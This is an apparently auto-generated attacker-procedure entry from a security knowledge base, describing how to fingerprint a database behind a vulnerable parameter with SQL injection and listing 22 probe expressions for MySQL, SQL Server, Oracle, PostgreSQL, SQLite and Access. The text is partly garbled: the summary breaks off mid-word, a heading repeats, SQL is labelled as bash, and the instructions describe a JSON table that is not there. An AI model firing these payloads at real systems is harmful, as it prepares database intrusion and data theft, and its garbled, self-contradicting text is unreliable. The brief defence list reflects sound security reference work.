---
id: eeaef0e6-b140-4ccf-b03c-c37d1efa8fc6
name: DBMS Identification via SQL Injection Commands
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:36.177045+00:00'
updated_at: '2023-04-10T20:24:21.007437+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[DBMS Identification]]'
- '[[SQL Injection]]'
commands:
- '[[Calculate binary checksum of 123]]'
- '[[Calculate CRC32 of ''MySQL'']]'
- '[[Check if 0 is not equal to 123]]'
- '[[Check if 1337 is equal to 1337]]'
- '[[Check if connection IDs match]]'
- '[[Check if ''i'' is equal to ''i'']]'
- '[[Check if ROWNUM is equal to itself]]'
- '[[Check if the CPU is busy]]'
- '[[Check if the last inserted row ID is equal to itself]]'
- '[[Check if the last inserted row ID is greater than 1]]'
- '[[Check if the number of connections is equal to itself]]'
- '[[Check if there are any active connections]]'
- '[[Check if user ID 1 is equal to itself]]'
- '[[Convert 1 to a double]]'
- '[[Convert 5 to an integer]]'
- '[[Convert ''AB'' from RAW to HEX]]'
- '[[Convert ''a'' from base 16 to base 2]]'
- '[[Get the client encoding]]'
- '[[Get the current text search configuration]]'
- '[[Get the name of the current database]]'
- '[[Get the version of SQLite]]'
- '[[Quote the literal value 42.5]]'
---

# DBMS Identification via SQL Injection Commands

## Summary

The DBMS Identification via SQL Injection Commands procedure is used to identify the type of database management system (DBMS) in use on a targeted system through the use of SQL injection commands. This technique is commonly used by attackers to determine the type of database in use in order to cra

## Description

# Description

The DBMS Identification via SQL Injection Commands procedure is used to identify the type of database management system (DBMS) in use on a targeted system through the use of SQL injection commands. This technique is commonly used by attackers to determine the type of database in use in order to craft specific SQL injection attacks that exploit known vulnerabilities in the identified DBMS. 

Technical Explanation: This procedure involves sending a series of SQL injection commands to the targeted system and analyzing the response to determine the type of DBMS in use. Different DBMSs respond differently to SQL injection commands, allowing an attacker to identify the type of DBMS in use. 

Business Value: By identifying the type of DBMS in use, an attacker can craft specific SQL injection attacks that exploit known vulnerabilities in the identified DBMS, potentially leading to unauthorized access to sensitive data.

 

## Requirements

1. Access to a system with a vulnerable DBMS

1. Knowledge of SQL injection commands

 

## Defense

1. Implement input validation and sanitization techniques to prevent SQL injection attacks

1. Regularly update and patch DBMS software to address known vulnerabilities

1. Monitor network traffic for indications of SQL injection attacks

 

## Objectives

1. Identify the type of DBMS in use on a targeted system

1. Craft specific SQL injection attacks that exploit known vulnerabilities in the identified DBMS

 

# Instructions

1. This JSON object contains a list of SQL commands that are compatible with different DBMS. The commands are tested on different DBMS and the result is shown in the second column. The third column contains the name of the DBMS. Use this list to find the right command for your DBMS.

 

> The commands in this JSON object are used to compare the compatibility of SQL commands across different DBMS. The first column contains SQL commands, the second column contains the result of the command when executed on the DBMS specified in the third column. Use this list to find the right command for your DBMS.



**Command** ([[Convert 'a' from base 16 to base 2]]):

```bash
conv('a',16,2)=conv('a',16,2)
```





**Command** ([[Check if connection IDs match]]):

```bash
connection_id()=connection_id()
```





**Command** ([[Calculate CRC32 of 'MySQL']]):

```bash
crc32('MySQL')=crc32('MySQL')
```





**Command** ([[Calculate binary checksum of 123]]):

```bash
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
```





**Command** ([[Check if there are any active connections]]):

```bash
@@CONNECTIONS>0
```





**Command** ([[Check if the number of connections is equal to itself]]):

```bash
@@CONNECTIONS=@@CONNECTIONS
```





**Command** ([[Check if the CPU is busy]]):

```bash
@@CPU_BUSY=@@CPU_BUSY
```





**Command** ([[Check if user ID 1 is equal to itself]]):

```bash
USER_ID(1)=USER_ID(1)
```





**Command** ([[Check if ROWNUM is equal to itself]]):

```bash
ROWNUM=ROWNUM
```





**Command** ([[Convert 'AB' from RAW to HEX]]):

```bash
RAWTOHEX('AB')=RAWTOHEX('AB')
```





**Command** ([[Check if 0 is not equal to 123]]):

```bash
LNNVL(0=123)
```





**Command** ([[Convert 5 to an integer]]):

```bash
5::integer=5
```





**Command** ([[Get the client encoding]]):

```bash
pg_client_encoding()=pg_client_encoding()
```





**Command** ([[Get the current text search configuration]]):

```bash
get_current_ts_config()=get_current_ts_config()
```





**Command** ([[Quote the literal value 42.5]]):

```bash
quote_literal(42.5)=quote_literal(42.5)
```





**Command** ([[Get the name of the current database]]):

```bash
current_database()=current_database()
```





**Command** ([[Get the version of SQLite]]):

```bash
sqlite_version()=sqlite_version()
```





**Command** ([[Check if the last inserted row ID is greater than 1]]):

```bash
last_insert_rowid()>1
```





**Command** ([[Check if the last inserted row ID is equal to itself]]):

```bash
last_insert_rowid()=last_insert_rowid()
```





**Command** ([[Convert 1 to a double]]):

```bash
cdbl(1)=cdbl(1)
```





**Command** ([[Check if 1337 is equal to 1337]]):

```bash
1337=1337
```





**Command** ([[Check if 'i' is equal to 'i']]):

```bash
'i'='i'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Calculate binary checksum of 123]]
- [[Calculate CRC32 of 'MySQL']]
- [[Check if 0 is not equal to 123]]
- [[Check if 1337 is equal to 1337]]
- [[Check if connection IDs match]]
- [[Check if 'i' is equal to 'i']]
- [[Check if ROWNUM is equal to itself]]
- [[Check if the CPU is busy]]
- [[Check if the last inserted row ID is equal to itself]]
- [[Check if the last inserted row ID is greater than 1]]
- [[Check if the number of connections is equal to itself]]
- [[Check if there are any active connections]]
- [[Check if user ID 1 is equal to itself]]
- [[Convert 1 to a double]]
- [[Convert 5 to an integer]]
- [[Convert 'AB' from RAW to HEX]]
- [[Convert 'a' from base 16 to base 2]]
- [[Get the client encoding]]
- [[Get the current text search configuration]]
- [[Get the name of the current database]]
- *...and 2 more*

## Tags

- [[DBMS Identification]]
- [[SQL Injection]]


